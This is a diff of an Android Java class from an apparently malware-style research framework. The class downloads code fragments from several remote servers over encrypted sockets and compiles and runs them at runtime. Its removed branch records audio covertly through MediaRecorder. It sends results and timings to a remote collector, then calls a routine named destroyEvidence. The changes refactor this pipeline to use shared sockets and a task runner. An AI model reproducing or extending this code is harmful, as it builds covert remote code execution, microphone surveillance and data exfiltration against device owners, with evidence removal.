@@ -13,6 +13,7 @@ import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.HashMap;
+import java.util.concurrent.Callable;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -23,26 +24,27 @@ class CompilationTask implements Runnable {
 
     private final Context context;
 
-    private final String socketCollectorHostname;
-    private final int socketCollectorPort;
-    private final String[] servers;
+    private CryptedSocket collectorSocket;
+    private CryptedSocket[] codeSenderSockets;
+
     private final String resultType;
     private final String arg;
-
-    private CryptedSocket socketCollector;
+    private final int polling;
+    private final int num;
 
     private final HashMap<Integer, String> pieces;
 
-    public CompilationTask(Context context, String socketCollectorHostname, int socketCollectorPort, String[] servers, String resultType, String arg) {
+    public CompilationTask(Context context, CryptedSocket collectorSocket, CryptedSocket[] codeSenderSockets, String resultType, String arg, int polling, int num) {
         this.context = context;
         this.pieces = new HashMap<>();
 
-        this.socketCollectorHostname = socketCollectorHostname;
-        this.socketCollectorPort = socketCollectorPort;
+        this.collectorSocket = collectorSocket;
+        this.codeSenderSockets = codeSenderSockets;
 
-        this.servers = servers;
         this.resultType = resultType;
         this.arg = arg;
+        this.polling = polling;
+        this.num = num;
     }
 
     @Override
@@ -51,19 +53,23 @@ class CompilationTask implements Runnable {
             //download phase
             long startDownloadPhase = System.nanoTime();
             this.pieces.clear();
-            for (int i = 0; i < servers.length; i++) {
-                String[] codeSenderParams = servers[i].split(":");
+            for (int i = 0; i < codeSenderSockets.length; i++) {
 
-                DownloadTask task = new DownloadTask(codeSenderParams[0], Integer.parseInt(codeSenderParams[1]), i);
-                ExecutorService executor = Executors.newSingleThreadExecutor();
-                executor.execute(task);
+                int pieceNumber = i;
+                TaskRunner.getInstance().executeCallable(new DownloadTask(codeSenderSockets[i]),
+                        result -> {
+                    if(result != null) {
+                        this.pieces.put(pieceNumber, result);
+                    }
+                });
             }
 
-            while (this.pieces.size() < servers.length) {
-                Thread.sleep(100);
+            //bust waiting until all download task completed
+            while (this.pieces.size() < codeSenderSockets.length) {
+                Thread.sleep(50);
             }
             StringBuilder codeBuilder = new StringBuilder();
-            for (int i = 0; i < servers.length; i++) {
+            for (int i = 0; i < codeSenderSockets.length; i++) {
                 codeBuilder.append(this.pieces.get(i));
             }
             String code = codeBuilder.toString();
@@ -95,82 +101,38 @@ class CompilationTask implements Runnable {
             //execution phase
             long startExecution = System.nanoTime();
             Object obj = compiler.getInstance("RuntimeClass");
-            String result;
-            if (this.resultType.equals("Sound")) {
-                Method firstMethod = obj.getClass().getDeclaredMethod("run", Context.class);
-                MediaRecorder recorder = (MediaRecorder) firstMethod.invoke(obj, this.context);
 
-                Thread.sleep(5000);
+            ExecutionTask task = new ExecutionTask(this.context, obj, "run", resultType, arg, num, polling);
+            TaskRunner.getInstance().executeCallable(task, result -> {
+                long endExecution = System.nanoTime();
+                //end execution phase
 
-                Method secondMethod = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
-                result = (String) secondMethod.invoke(obj, recorder, this.context);
-            } else {
-                Method method = obj.getClass().getDeclaredMethod("run", Context.class);
-                result = (String) method.invoke(obj, this.context);
-            }
-            long endExecution = System.nanoTime();
-            String resultToSend = "Result: " + result;
-            //end execution phase
 
-            //eval timing
-            double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
-            double timeToParse = (endParsing - startParsing) / 1000000.0;
-            double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
-            double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
-            double timeToExecute = (endExecution - startExecution) / 1000000.0;
-            String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;
+                //eval timing
+                double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
+                double timeToParse = (endParsing - startParsing) / 1000000.0;
+                double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
+                double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
+                double timeToExecute = (endExecution - startExecution) / 1000000.0;
+                String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;
 
-            //collector phase
-            this.socketCollector = new CryptedSocket(this.socketCollectorHostname, this.socketCollectorPort);
-            this.socketCollector.connect();
-            this.socketCollector.write(timingToSend + "|" + resultToSend);
-            this.socketCollector.close();
+
+                String resultToSend = "Result: " + result;
+                String toCollect = timingToSend + "|" + resultToSend;
+
+                //collector phase
+                CollectorTask collectorTask = new CollectorTask(this.collectorSocket, toCollect);
+                TaskRunner.getInstance().execute(collectorTask);
+            });
 
             //destroy evidence
             compiler.destroyEvidence();
+
         } catch (InterruptedException interruptedException) {
             Log.d(TAG, Log.getStackTraceString(interruptedException));
             Thread.currentThread().interrupt();
         } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InvalidSourceCodeException | IOException | EvidenceLeftException e) {
             Log.d(TAG, Log.getStackTraceString(e));
-            this.socketCollector.close();
-        }
-        this.socketCollector.close();
-    }
-
-
-    class DownloadTask implements Runnable {
-        private static final String TAG = "DownloadTask";
-
-        private final String socketCodeSenderHostname;
-        private final int socketCodeSenderPort;
-        private final int piecesNumber;
-
-        private CryptedSocket socketCodeSender;
-
-        public DownloadTask(String socketCodeSenderHostname, int socketCodeSenderPort, int pieceNumber) {
-            this.socketCodeSenderHostname = socketCodeSenderHostname;
-            this.socketCodeSenderPort = socketCodeSenderPort;
-            this.piecesNumber = pieceNumber;
-        }
-
-        @Override
-        public void run() {
-            try {
-                Log.d(TAG, "Starting downloadTask...");
-
-                this.socketCodeSender = new CryptedSocket(this.socketCodeSenderHostname, this.socketCodeSenderPort);
-                this.socketCodeSender.connect();
-
-                String piece = this.socketCodeSender.read();
-                pieces.put(this.piecesNumber, piece);
-
-                this.socketCodeSender.close();
-            } catch (IOException e) {
-                Log.d(TAG, Log.getStackTraceString(e));
-                this.socketCodeSender.close();
-            }
-            this.socketCodeSender.close();
         }
     }
 }
